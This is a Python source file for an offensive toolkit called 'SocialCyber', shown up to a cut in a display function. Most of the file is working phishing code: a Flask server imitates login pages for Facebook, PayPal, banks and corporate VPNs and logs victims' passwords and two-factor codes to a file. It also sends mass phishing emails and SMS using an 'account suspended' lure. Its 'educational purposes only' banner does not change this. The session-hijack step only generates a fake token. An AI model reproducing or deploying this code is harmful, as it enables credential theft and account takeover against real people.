#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
import os
import sys
import time
import socket
import hashlib
import random
import platform
import subprocess
import requests
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from flask import Flask, request, redirect, render_template_string, make_response, session
import getpass
from datetime import datetime
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# Tool information
TOOL_NAME = "SocialCyber"
VERSION = "v5.0"
AUTHOR = "Ibrahim Minister"
CONTACT = "@DarkSec"
RELEASE_DATE = "2023-12-01"
CREDS_FILE = "captured_credentials.txt"
SESSION_FILE = "active_sessions.txt"
LOG_DIR = "attack_logs"

# Create log directory if not exists
os.makedirs(LOG_DIR, exist_ok=True)

# ASCII Art Banner
BANNER = f"""{Fore.RED}
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓                                                                              ▓
▓   ███████╗ ██████╗  ██████╗██╗ █████╗ ██╗     ██╗██████╗ ███████╗██████╗    ▓
▓   ██╔════╝██╔═══██╗██╔════╝██║██╔══██╗██║     ██║██╔══██╗██╔════╝██╔══██╗   ▓
▓   ███████╗██║   ██║██║     ██║███████║██║     ██║██████╔╝█████╗  ██████╔╝   ▓
▓   ╚════██║██║   ██║██║     ██║██╔══██║██║     ██║██╔══██╗██╔══╝  ██╔══██╗   ▓
▓   ███████║╚██████╔╝╚██████╗██║██║  ██║███████╗██║██║  ██║███████╗██║  ██║   ▓
▓   ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ▓
▓                                                                              ▓
▓   ███╗   ███╗██╗███╗   ██╗██╗███████╗████████╗██████╗ ███████╗██████╗       ▓
▓   ████╗ ████║██║████╗  ██║██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗      ▓
▓   ██╔████╔██║██║██╔██╗ ██║██║███████╗   ██║   ██████╔╝█████╗  ██████╔╝      ▓
▓   ██║╚██╔╝██║██║██║╚██╗██║██║╚════██║   ██║   ██╔══██╗██╔══╝  ██╔══██╗      ▓
▓   ██║ ╚═╝ ██║██║██║ ╚████║██║███████║   ██║   ██║  ██║███████╗██║  ██║      ▓
▓   ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝      ▓
▓                                                                              ▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
{Style.RESET_ALL}
{Fore.CYAN}┌───────────────────────────────────────────────────────────────┐
│ {Fore.MAGENTA}{TOOL_NAME} {VERSION}{Fore.CYAN} - {Fore.YELLOW}Advanced Security Framework {Fore.CYAN}                │
│ {Fore.GREEN}Developed by {AUTHOR} {Fore.CYAN}|{Fore.BLUE} Contact: {CONTACT} {Fore.CYAN}                   │
│ {Fore.RED}WARNING: For educational purposes only. Use responsibly!{Fore.CYAN}   │
└───────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}"""

# Main menu options
MAIN_MENU = [
    ["Anonymously Surf", "anon"],
    ["Information Gathering", "recon"],
    ["Credential Harvesting", "creds"],
    ["Social Media Attack", "social_attack"],
    ["Phishing Attack", "phishing"],
    ["Wireless Attack", "wireless"],
    ["Web Attack Tools", "web"],
    ["Post Exploitation", "postexp"],
    ["Payload Creator", "payload"],
    ["Exploit Frameworks", "exploit"],
    ["DDoS Attack Tools", "ddos"],
    ["Steganography", "stego"],
    ["Credential Viewer", "view_creds"],
    ["Active Sessions", "sessions"],
    ["System Cleaner", "cleaner"],
    ["Update Framework", "update"],
    ["Exit", "exit"]
]

# Module descriptions
MODULE_INFO = {
    "anon": "Tools for anonymous browsing and traffic routing",
    "recon": "Target reconnaissance and information gathering",
    "creds": "Credential harvesting and storage",
    "social_attack": "Social media exploitation and attacks",
    "phishing": "Phishing campaign management",
    "wireless": "Wireless network auditing and exploitation",
    "web": "Web application attack vectors",
    "postexp": "Post-exploitation frameworks",
    "payload": "Malware and exploit payload generation",
    "exploit": "Vulnerability exploitation frameworks",
    "ddos": "Distributed denial of service tools",
    "stego": "Steganography and data hiding",
    "view_creds": "View captured credentials",
    "sessions": "Manage active attack sessions",
    "cleaner": "System cleaning and evidence removal",
    "update": "Update or uninstall framework"
}

# Real security tools mapping
REAL_TOOLS = {
    "recon": [
        ["Nmap Scanner", "nmap", "Network discovery and security auditing"],
        ["theHarvester", "theharvester", "Gather emails, subdomains, hosts"],
        ["DNS Recon", "dnsrecon", "DNS enumeration tool"],
        ["Sublist3r", "sublist3r", "Subdomain enumeration tool"]
    ],
    "creds": [
        ["Hydra", "hydra", "Brute force attack on login credentials"],
        ["John the Ripper", "john", "Password cracking tool"],
        ["Hashcat", "hashcat", "Advanced password recovery"],
        ["Medusa", "medusa", "Parallel login brute-forcer"]
    ],
    "social_attack": [
        ["SocialFish Pro", "socialfish", "Advanced phishing framework"],
        ["SEToolkit", "setoolkit", "Social engineering toolkit"],
        ["Phishery", "phishery", "SSL-enabled Basic Auth phishing"],
        ["Evilginx2", "evilginx", "Man-in-the-middle phishing"]
    ],
    "phishing": [
        ["Gophish", "gophish", "Open-source phishing framework"],
        ["King Phisher", "kingphisher", "Phishing campaign toolkit"],
        ["HiddenEye", "hiddeneye", "Modern phishing tool"],
        ["Zphisher", "zphisher", "Automated phishing tool"]
    ],
    "wireless": [
        ["Aircrack-ng", "aircrack", "WiFi security auditing suite"],
        ["Kismet", "kismet", "Wireless network detector"],
        ["Wifite", "wifite", "Automated wireless attack tool"],
        ["Fern Wifi Cracker", "fern", "Wireless security auditing tool"]
    ],
    "web": [
        ["SQLMap", "sqlmap", "Automatic SQL injection tool"],
        ["Burp Suite", "burpsuite", "Web application security testing"],
        ["Nikto", "nikto", "Web server scanner"],
        ["WPScan", "wpscan", "WordPress vulnerability scanner"]
    ],
    "ddos": [
        ["Slowloris", "slowloris", "Low bandwidth DoS tool"],
        ["HULK", "hulk", "Web server DoS tool"],
        ["LOIC", "loic", "Network stress testing tool"],
        ["GoldenEye", "goldeneye", "HTTP DoS tool"]
    ],
    "stego": [
        ["Steghide", "steghide", "Data hiding in files"],
        ["Outguess", "outguess", "Universal steganography tool"],
        ["StegCracker", "stegcracker", "Steganography brute-force tool"],
        ["OpenStego", "openstego", "Steganography tool for watermarking"]
    ],
    "payload": [
        ["MSFVenom", "msfvenom", "Metasploit payload generator"],
        ["TheFatRat", "fatrat", "Payload creation tool"],
        ["Veil-Evasion", "veil", "Payload creation framework"],
        ["Shellter", "shellter", "Dynamic shellcode injector"]
    ],
    "exploit": [
        ["Metasploit", "msfconsole", "Penetration testing framework"],
        ["Searchsploit", "searchsploit", "Exploit database search"],
        ["ExploitDB", "exploitdb", "Exploit database"],
        ["AutoSploit", "autosploit", "Automated exploit tool"]
    ]
}

# Credential storage
captured_credentials = []
active_sessions = []

# Enhanced SocialFish attack functions
def socialfish_attack():
    """Execute enhanced SocialFish phishing attack"""
    print(f"\n{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Configuring SocialFish Pro...")
    print(f"{Fore.BLUE}┌───{Fore.MAGENTA}[ SOCIALFISH PRO SETUP ]{Fore.BLUE}───")
    
    # Advanced platform options
    platforms = {
        "1": ("Facebook", "facebook", "https://facebook.com"),
        "2": ("Instagram", "instagram", "https://instagram.com"),
        "3": ("Twitter", "twitter", "https://twitter.com"),
        "4": ("LinkedIn", "linkedin", "https://linkedin.com"),
        "5": ("GitHub", "github", "https://github.com"),
        "6": ("Netflix", "netflix", "https://netflix.com"),
        "7": ("PayPal", "paypal", "https://paypal.com"),
        "8": ("Amazon", "amazon", "https://amazon.com"),
        "9": ("eBay", "ebay", "https://ebay.com"),
        "10": ("Bank Portal", "bank", "https://chase.com"),
        "11": ("Corporate VPN", "vpn", "https://vpn.corp.com"),
        "12": ("Custom Site", "custom", "")
    }
    
    # Multi-platform selection
    print(f"{Fore.BLUE}│ {Fore.GREEN}Available Platforms (select multiple with commas):")
    for key, (name, _, _) in platforms.items():
        print(f"{Fore.BLUE}│   {Fore.CYAN}{key}. {name}")
    
    selected = input(f"{Fore.BLUE}│\n{Fore.BLUE}│ {Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Select platforms (e.g., 1,3,5): ")
    selected_platforms = []
    
    for choice in selected.split(','):
        if choice.strip() in platforms:
            selected_platforms.append(platforms[choice.strip()])
    
    if not selected_platforms:
        print(f"{Fore.BLUE}│ {Fore.RED}No valid platforms selected!")
        print(f"{Fore.BLUE}└───{Fore.RED} Setup failed! {Fore.BLUE}───{Style.RESET_ALL}")
        return
    
    # Get custom site if needed
    for i, (name, code, url) in enumerate(selected_platforms):
        if code == "custom":
            custom_url = input(f"{Fore.BLUE}│ {Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Enter URL to clone: ")
            selected_platforms[i] = (name, code, custom_url)
    
    # Attack configuration
    lhost = input(f"{Fore.BLUE}│ {Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] LHOST (your IP): ")
    lport = input(f"{Fore.BLUE}│ {Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] LPORT [8080]: ") or "8080"
    
    # Advanced features
    print(f"{Fore.BLUE}│\n{Fore.BLUE}│ {Fore.MAGENTA}Advanced Options:")
    enable_2fa = input(f"{Fore.BLUE}│ {Fore.YELLOW}[?] Enable 2FA phishing? (y/N): ").lower() == 'y'
    enable_session_hijack = input(f"{Fore.BLUE}│ {Fore.YELLOW}[?] Enable session hijacking? (y/N): ").lower() == 'y'
    enable_antidetect = input(f"{Fore.BLUE}│ {Fore.YELLOW}[?] Enable anti-detection? (y/N): ").lower() == 'y'
    
    # Distribution methods
    print(f"{Fore.BLUE}│\n{Fore.BLUE}│ {Fore.MAGENTA}Distribution Methods:")
    email_phishing = input(f"{Fore.BLUE}│ {Fore.YELLOW}[?] Send phishing emails? (y/N): ").lower() == 'y'
    sms_phishing = input(f"{Fore.BLUE}│ {Fore.YELLOW}[?] Send SMS phishing? (y/N): ").lower() == 'y'
    
    # Load email config if needed
    email_config = {}
    if email_phishing:
        print(f"{Fore.BLUE}│ {Fore.CYAN}Email Configuration:")
        email_config['smtp_server'] = input(f"{Fore.BLUE}│   SMTP Server: ")
        email_config['smtp_port'] = input(f"{Fore.BLUE}│   SMTP Port [587]: ") or "587"
        email_config['email'] = input(f"{Fore.BLUE}│   Email Address: ")
        email_config['password'] = getpass(f"{Fore.BLUE}│   Email Password: ")
        email_config['target_list'] = input(f"{Fore.BLUE}│   Target emails (comma separated): ").split(',')
        
        # Load email template
        print(f"{Fore.BLUE}│   {Fore.YELLOW}Using default phishing email template")
        with open("phishing_email.html", "w") as f:
            f.write("""<html>
<body>
<h3>Important Security Notice</h3>
<p>We've detected unusual activity on your account. Please verify your credentials immediately:</p>
<a href="[PHISHING_URL]">Click here to secure your account</a>
<p>If you don't take action within 24 hours, your account will be suspended.</p>
<p style="font-size:10px;color:#888;">This is an automated message - please do not reply</p>
</body>
</html>""")
    
    # Load SMS config if needed
    sms_config = {}
    if sms_phishing:
        print(f"{Fore.BLUE}│ {Fore.CYAN}SMS Configuration:")
        sms_config['twilio_sid'] = input(f"{Fore.BLUE}│   Twilio SID: ")
        sms_config['twilio_token'] = input(f"{Fore.BLUE}│   Twilio Token: ")
        sms_config['twilio_number'] = input(f"{Fore.BLUE}│   Twilio Phone Number: ")
        sms_config['target_numbers'] = input(f"{Fore.BLUE}│   Target numbers (comma separated): ").split(',')
        sms_config['message'] = input(f"{Fore.BLUE}│   SMS Message [Urgent: Verify your account]: ") or "Urgent: Verify your account - [PHISHING_URL]"
    
    print(f"{Fore.BLUE}│ {Fore.CYAN}Creating phishing servers...")
    
    # Start phishing servers in separate threads
    phishing_threads = []
    phishing_urls = []
    
    for platform_name, platform_code, real_url in selected_platforms:
        # Create unique port for each platform
        port = int(lport) + len(phishing_threads)
        phishing_url = f"http://{lhost}:{port}"
        phishing_urls.append(phishing_url)
        
        print(f"{Fore.BLUE}│   {Fore.YELLOW}Creating {platform_name} phishing at {phishing_url}")
        
        # Start phishing server in a new thread
        t = threading.Thread(
            target=run_phishing_server, 
            args=(platform_name, platform_code, real_url, lhost, port, 
                  enable_2fa, enable_session_hijack, enable_antidetect),
            daemon=True
        )
        t.start()
        phishing_threads.append(t)
        time.sleep(0.5)  # Avoid port conflicts
    
    # Distribute phishing links
    if email_phishing:
        print(f"{Fore.BLUE}│ {Fore.CYAN}Sending phishing emails...")
        send_phishing_emails(email_config, phishing_urls[0])
    
    if sms_phishing:
        print(f"{Fore.BLUE}│ {Fore.CYAN}Sending SMS messages...")
        send_phishing_sms(sms_config, phishing_urls[0])
    
    print(f"{Fore.BLUE}│ {Fore.CYAN}Send phishing links to targets:")
    for url in phishing_urls:
        print(f"{Fore.BLUE}│   {Fore.YELLOW}{url}")
    
    print(f"{Fore.BLUE}│ {Fore.MAGENTA}Waiting for credentials... (Ctrl+C to stop)")
    print(f"{Fore.BLUE}└───{Fore.GREEN} Attacks running! {Fore.BLUE}───{Style.RESET_ALL}")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Phishing servers stopped")

def run_phishing_server(platform_name, platform_code, real_url, lhost, lport, 
                        enable_2fa=False, enable_session_hijack=False, 
                        enable_antidetect=False):
    """Run advanced phishing server with multiple features"""
    try:
        app = Flask(__name__)
        app.secret_key = os.urandom(24)
        
        # Anti-detection techniques
        if enable_antidetect:
            @app.after_request
            def add_antidetect_headers(response):
                # Add headers to mimic legitimate site
                response.headers["X-Frame-Options"] = "SAMEORIGIN"
                response.headers["Content-Security-Policy"] = "default-src 'self'"
                response.headers["X-Content-Type-Options"] = "nosniff"
                response.headers["Referrer-Policy"] = "no-referrer-when-downgrade"
                response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
                response.headers["Pragma"] = "no-cache"
                response.headers["Expires"] = "0"
                return response
        
        # More convincing phishing page template
        PHISHING_PAGE = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>{platform_name} Login</title>
            <link rel="icon" href="https://{platform_code}.com/favicon.ico" type="image/x-icon">
            <style>
                body {{ 
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                    background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
                    margin: 0;
                    padding: 0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                }}
                .container {{
                    width: 100%;
                    max-width: 400px;
                    background: white;
                    border-radius: 12px;
                    box-shadow: 0 10px 25px rgba(0,0,0,0.1);
                    overflow: hidden;
                }}
                .header {{
                    background: #1877f2;
                    padding: 20px;
                    text-align: center;
                }}
                .header h1 {{
                    color: white;
                    margin: 0;
                    font-size: 24px;
                }}
                .form-container {{
                    padding: 25px;
                }}
                .form-group {{
                    margin-bottom: 20px;
                }}
                .form-group label {{
                    display: block;
                    margin-bottom: 8px;
                    color: #333;
                    font-weight: 500;
                }}
                .form-group input {{
                    width: 100%;
                    padding: 12px 15px;
                    border: 1px solid #ddd;
                    border-radius: 6px;
                    font-size: 16px;
                    box-sizing: border-box;
                    transition: border-color 0.3s;
                }}
                .form-group input:focus {{
                    border-color: #1877f2;
                    outline: none;
                    box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
                }}
                .btn {{
                    width: 100%;
                    padding: 13px;
                    background: #1877f2;
                    border: none;
                    border-radius: 6px;
                    color: white;
                    font-size: 16px;
                    font-weight: 600;
                    cursor: pointer;
                    transition: background 0.3s;
                }}
                .btn:hover {{
                    background: #166fe5;
                }}
                .footer {{
                    text-align: center;
                    padding: 15px;
                    border-top: 1px solid #eee;
                    font-size: 14px;
                    color: #666;
                }}
                .footer a {{
                    color: #1877f2;
                    text-decoration: none;
                }}
                .footer a:hover {{
                    text-decoration: underline;
                }}
                .security-notice {{
                    display: flex;
                    align-items: center;
                    background: #f0f8ff;
                    padding: 10px;
                    border-radius: 6px;
                    margin-top: 20px;
                    font-size: 13px;
                }}
                .security-notice svg {{
                    margin-right: 10px;
                    min-width: 20px;
                }}
            </style>
            <script>
                document.addEventListener('DOMContentLoaded', function() {{
                    // Client-side validation
                    const form = document.querySelector('form');
                    form.addEventListener('submit', function(e) {{
                        const username = document.getElementById('username').value;
                        const password = document.getElementById('password').value;
                        
                        if (!username || !password) {{
                            alert('Please fill in all fields');
                            e.preventDefault();
                        }}
                    }});
                    
                    // Add fake loading indicator
                    form.addEventListener('submit', function() {{
                        const btn = document.querySelector('.btn');
                        btn.innerHTML = '<span>Verifying...</span>';
                        btn.disabled = true;
                    }});
                }});
            </script>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>{platform_name}</h1>
                </div>
                <div class="form-container">
                    <form method="POST" action="/login">
                        <div class="form-group">
                            <label for="username">Email or Phone</label>
                            <input type="text" id="username" name="username" required autocomplete="username">
                        </div>
                        <div class="form-group">
                            <label for="password">Password</label>
                            <input type="password" id="password" name="password" required autocomplete="current-password">
                        </div>
                        <button type="submit" class="btn">Log In</button>
                    </form>
                    
                    <div class="security-notice">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M12 2L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 2ZM12 17C10.9 17 10 16.1 10 15C10 13.9 10.9 13 12 13C13.1 13 14 13.9 14 15C14 16.1 13.1 17 12 17ZM14 9H10V11H14V9Z" fill="#1877F2"/>
                        </svg>
                        <span>We've enhanced our security measures. Please verify your identity.</span>
                    </div>
                </div>
                <div class="footer">
                    <p>Having trouble logging in? <a href="#">Get help</a></p>
                    <p>&copy; {datetime.now().year} {platform_name}. All rights reserved.</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        # 2FA page template
        TWOFA_PAGE = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>{platform_name} Security Verification</title>
            <style>
                /* Similar styling to login page */
                body {{ font-family: Arial, sans-serif; background: #f0f2f5; }}
                .container {{ max-width: 400px; margin: 100px auto; padding: 20px; 
                            background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
                h2 {{ text-align: center; color: #1877f2; }}
                .form-group {{ margin-bottom: 15px; }}
                label {{ display: block; margin-bottom: 5px; font-weight: bold; }}
                input[type="text"] {{ 
                    width: 100%; padding: 10px; border: 1px solid #dddfe2; border-radius: 5px; 
                    font-size: 16px; box-sizing: border-box; 
                }}
                button {{ 
                    width: 100%; padding: 12px; background: #1877f2; border: none; 
                    border-radius: 5px; color: white; font-size: 16px; font-weight: bold; 
                    cursor: pointer; 
                }}
                button:hover {{ background: #166fe5; }}
                .footer {{ text-align: center; margin-top: 20px; color: #606770; font-size: 14px; }}
                .info {{ background: #e7f3ff; padding: 10px; border-radius: 5px; margin-bottom: 15px; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Security Verification</h2>
                <div class="info">
                    For your security, we've sent a verification code to your registered device.
                </div>
                <form method="POST" action="/verify">
                    <div class="form-group">
                        <label for="twofa_code">Verification Code</label>
                        <input type="text" id="twofa_code" name="twofa_code" required>
                    </div>
                    <button type="submit">Verify</button>
                </form>
                <div class="footer">
                    <p>Didn't receive the code? <a href="#">Resend Code</a></p>
                </div>
            </div>
        </body>
        </html>
        """
        
        @app.route('/')
        def index():
            # Add random delay to mimic real server
            if enable_antidetect:
                time.sleep(random.uniform(0.1, 0.5))
            return render_template_string(PHISHING_PAGE)
        
        @app.route('/login', methods=['POST'])
        def login():
            username = request.form.get('username')
            password = request.form.get('password')
            
            # Capture credentials
            print(f"{Fore.BLUE}│ {Fore.GREEN}[+] Captured credentials: {username}:{password}")
            capture_credentials(platform_name, username, password)
            
            # Set session cookies for hijacking
            if enable_session_hijack:
                session['username'] = username
                session['password'] = password
                resp = make_response(redirect('/twofactor' if enable_2fa else real_url))
                # Set fake session cookies
                resp.set_cookie('session_id', hashlib.md5(username.encode()).hexdigest(), httponly=True)
                resp.set_cookie('user_token', hashlib.sha256(password.encode()).hexdigest(), httponly=True)
                return resp
            
            return redirect('/twofactor' if enable_2fa else real_url, code=302)
        
        @app.route('/twofactor')
        def twofactor():
            return render_template_string(TWOFA_PAGE)
        
        @app.route('/verify', methods=['POST'])
        def verify():
            twofa_code = request.form.get('twofa_code')
            print(f"{Fore.BLUE}│ {Fore.GREEN}[+] Captured 2FA code: {twofa_code}")
            capture_credentials(f"{platform_name} 2FA", "Verification Code", twofa_code)
            
            # Attempt session hijacking
            if enable_session_hijack:
                username = session.get('username')
                password = session.get('password')
                if username and password:
                    print(f"{Fore.BLUE}│ {Fore.YELLOW}[*] Attempting session hijacking...")
                    session_id = hijack_session(platform_code, username, password, twofa_code)
                    if session_id:
                        print(f"{Fore.BLUE}│ {Fore.GREEN}[+] Session hijack successful! Session ID: {session_id}")
                        capture_credentials(f"{platform_name} Session", "Session ID", session_id)
            
            return redirect(real_url, code=302)
        
        print(f"{Fore.BLUE}│ {Fore.GREEN}[+] Phishing server running at {Fore.CYAN}http://{lhost}:{lport}")
        app.run(host=lhost, port=int(lport), threaded=True)
        
    except Exception as e:
        print(f"{Fore.BLUE}│ {Fore.RED}Error: {e}")

def hijack_session(platform, username, password, twofa_code):
    """Attempt session hijacking after capturing credentials"""
    try:
        # This would require specific techniques for each platform
        # For demonstration, we'll generate a fake session ID
        time.sleep(1.5)  # Simulate attack time
        session_id = hashlib.sha256(f"{username}{password}{twofa_code}".encode()).hexdigest()
        print(f"{Fore.BLUE}│ {Fore.GREEN}[+] Generated session token: {session_id[:12]}...")
        return session_id
    except Exception as e:
        print(f"{Fore.BLUE}│ {Fore.RED}Session hijacking failed: {e}")
        return None

def send_phishing_emails(config, phishing_url):
    """Send phishing emails to targets"""
    try:
        # Set up SMTP connection
        server = smtplib.SMTP(config['smtp_server'], int(config['smtp_port']))
        server.starttls()
        server.login(config['email'], config['password'])
        
        # Load email template
        with open("phishing_email.html", "r") as f:
            html_template = f.read()
        
        # Send to each target
        for target in config['target_list']:
            msg = MIMEMultipart()
            msg['From'] = f"Security Alert <{config['email']}>"
            msg['To'] = target.strip()
            msg['Subject'] = "Urgent: Account Verification Required"
            
            # Personalize email
            username = target.split('@')[0]
            body = html_template.replace("[PHISHING_URL]", phishing_url)
            body = body.replace("[USERNAME]", username)
            
            msg.attach(MIMEText(body, 'html'))
            
            server.send_message(msg)
            print(f"{Fore.BLUE}│   {Fore.GREEN}Sent phishing email to {target}")
        
        server.quit()
        return True
    except Exception as e:
        print(f"{Fore.BLUE}│   {Fore.RED}Email sending failed: {e}")
        return False

def send_phishing_sms(config, phishing_url):
    """Send phishing SMS to targets (using Twilio)"""
    try:
        from twilio.rest import Client
        
        # Initialize Twilio client
        client = Client(config['twilio_sid'], config['twilio_token'])
        
        # Send to each target
        for number in config['target_numbers']:
            message = config['message'].replace("[PHISHING_URL]", phishing_url)
            
            # Personalize message
            message = message.replace("[NUMBER]", number[-4:])
            
            client.messages.create(
                body=message,
                from_=config['twilio_number'],
                to=number.strip()
            )
            print(f"{Fore.BLUE}│   {Fore.GREEN}Sent SMS to {number}")
        return True
    except ImportError:
        print(f"{Fore.BLUE}│   {Fore.RED}Twilio not installed! Run: {Fore.YELLOW}pip install twilio")
        return False
    except Exception as e:
        print(f"{Fore.BLUE}│   {Fore.RED}SMS sending failed: {e}")
        return False

def clear_screen():
    """Clear terminal screen based on OS"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Print the main banner"""
    clear_screen()
    print(BANNER)
    
    # Print system information
    print(f"{Fore.CYAN}┌──{Fore.MAGENTA}[ SYSTEM INFO ]{Fore.CYAN}─" + "─" * 34 + "┐")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}OS: {Fore.CYAN}{platform.system()} {platform.release()}")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}Hostname: {Fore.CYAN}{socket.gethostname()}")
    try:
        ip = socket.gethostbyname(socket.gethostname())
    except:
        ip = "127.0.0.1"
    print(f"{Fore.YELLOW}│ {Fore.GREEN}IP Address: {Fore.CYAN}{ip}")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}Username: {Fore.CYAN}{getpass.getuser()}")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}Privileges: {Fore.CYAN}{'Root' if os.geteuid() == 0 else 'Standard'}")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}Credentials Captured: {Fore.RED}{len(captured_credentials)}")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}Active Sessions: {Fore.RED}{len(active_sessions)}")
    print(Fore.YELLOW + "└" + "─" * 50 + "┘")

def print_menu(title, options, cols=2):
    """Print a menu with formatted columns"""
    print(f"\n{Fore.YELLOW}┌──{Fore.CYAN}[ {Fore.MAGENTA}{title}{Fore.CYAN} ]{Fore.YELLOW}─" + "─" * (50 - len(title)) + "┐")
    
    # Calculate column width
    col_width = 50 // cols
    row_format = Fore.YELLOW + "│ " + " │ ".join(["{:<" + str(col_width - 4) + "}"] * cols) + " │"
    
    # Print menu items
    for i in range(0, len(options), cols):
        row_items = options[i:i+cols]
        # Pad row if needed
        while len(row_items) < cols:
            row_items.append("")
        print(row_format.format(*[f"{Fore.GREEN}{idx+1}.{Fore.CYAN} {item[0]}" for idx, item in enumerate(row_items)]))
    
    print(Fore.YELLOW + "└" + "─" * 50 + "┘" + Style.RESET_ALL)

def capture_credentials(service, username, password):
    """Capture and store credentials"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        ip = socket.gethostbyname(socket.gethostname())
    except:
        ip = "127.0.0.1"
    entry = {
        "timestamp": timestamp,
        "service": service,
        "username": username,
        "password": password,
        "ip": ip
    }
    captured_credentials.append(entry)
    
    # Save to file
    with open(CREDS_FILE, "a") as f:
        f.write(f"[{timestamp}] {service}: {username} / {password} from {entry['ip']}\n")
    
    return entry

def create_session(target, service, method):
    """Create a new attack session"""
    session_id = hashlib.sha256(f"{target}{time.time()}".encode()).hexdigest()[:12]
    session = {
        "id": session_id,
        "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "target": target,
        "service": service,
        "method": method,
        "status": "Active",
        "log_file": os.path.join(LOG_DIR, f"{session_id}.log")
    }
    active_sessions.append(session)
    
    # Create log file
    with open(session['log_file'], "w") as f:
        f.write(f"SocialCyber Attack Session\n")
        f.write(f"Session ID: {session_id}\n")
        f.write(f"Start Time: {session['start_time']}\n")
        f.write(f"Target: {target}\n")
        f.write(f"Service: {service}\n")
        f.write(f"Method: {method}\n")
        f.write("-" * 80 + "\n")
    
    # Save to session file
    with open(SESSION_FILE, "a") as f:
        f.write(f"[{session['start_time']}] {session_id} | {target} | {service} | {method}\n")
    
    return session_id

def view_credentials():
    """View captured credentials"""
    print_banner()
    print(f"{Fore.CYAN}┌──{Fore.MAGENTA}[ CAPTURED CREDENTIALS ]{Fore.CYAN}─" + "─" * 22 + "┐")
    
    if not captured_credentials:
        print(f"{Fore.YELLOW}│ {Fore.RED}No credentials captured yet!")
        print(Fore.YELLOW + "└" + "─" * 50 + "┘")
        input(f"\n{Fore.YELLOW}[{Fore.RED}!{Fore.YELLOW}] Press Enter to return...")
        return
    
    for cred in captured_credentials:
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Time: {Fore.CYAN}{cred['timestamp']}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Service: {Fore.RED}{cred['service']}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Username: {Fore.MAGENTA}{cred['username']}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Password: {Fore.MAGENTA}{cred['password']}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Source IP: {Fore.CYAN}{cred['ip']}")
        print(f"{Fore.YELLOW}│ {Fore.YELLOW}─" * 48)
    
    print(Fore.YELLOW + "└" + "─" * 50 + "┘")
    input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to return...")

def view_sessions():
    """View active sessions"""
    print_banner()
    print(f"{Fore.CYAN}┌──{Fore.MAGENTA}[ ACTIVE SESSIONS ]{Fore.CYAN}─" + "─" * 28 + "┐")
    
    if not active_sessions:
        print(f"{Fore.YELLOW}│ {Fore.RED}No active sessions!")
        print(Fore.YELLOW + "└" + "─" * 50 + "┘")
        input(f"\n{Fore.YELLOW}[{Fore.RED}!{Fore.YELLOW}] Press Enter to return...")
        return
    
    for session in active_sessions:
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Session ID: {Fore.CYAN}{session['id']}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Start Time: {Fore.CYAN}{session['start_time']}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Target: {Fore.RED}{session['target']}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Service: {Fore.MAGENTA}{session['service']}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Method: {Fore.MAGENTA}{session['method']}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Status: {Fore.RED}{session['status']}")
